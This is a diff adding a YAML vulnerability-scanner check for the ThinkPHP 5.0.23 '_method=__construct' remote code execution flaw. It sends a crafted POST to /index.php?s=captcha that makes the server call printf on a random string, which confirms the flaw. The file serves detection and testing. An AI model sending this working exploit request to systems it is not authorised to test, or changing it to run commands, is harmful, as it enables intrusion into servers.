@@ -1,0 +1,22 @@
+name: poc-yaml-thinkphp5023-method-rce
+manual: true
+transport: http
+set:
+  r1: md5(string(randomInt(2000000, 4000000)))
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /index.php?s=captcha
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]={{r1}}
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+expression: r0()
+detail:
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+  vulnerability:
+    level: critical
